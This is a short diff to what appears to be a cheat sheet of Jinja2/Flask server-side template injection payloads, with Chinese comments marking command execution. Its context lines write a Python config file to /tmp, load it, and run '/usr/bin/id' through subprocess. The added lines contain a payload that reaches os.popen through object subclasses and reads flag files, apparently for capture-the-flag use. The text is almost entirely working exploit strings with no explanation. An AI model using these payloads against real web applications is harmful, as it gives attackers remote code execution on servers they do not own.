@@ -40,7 +40,9 @@ python2
 name=%7B%7B ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') %7D%7D
 name=%7B%7B config.from_pyfile('/tmp/owned.cfg') %7D%7D 
 name=%7B%7B%20config[%27RUNCMD%27](%27/usr/bin/id%27,shell=True)%20%7D%7D
-#命令
+#命令执行
+{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].__dict__['popen']('cat flag*').read()}}
+
 
 python3
 #命令执行：
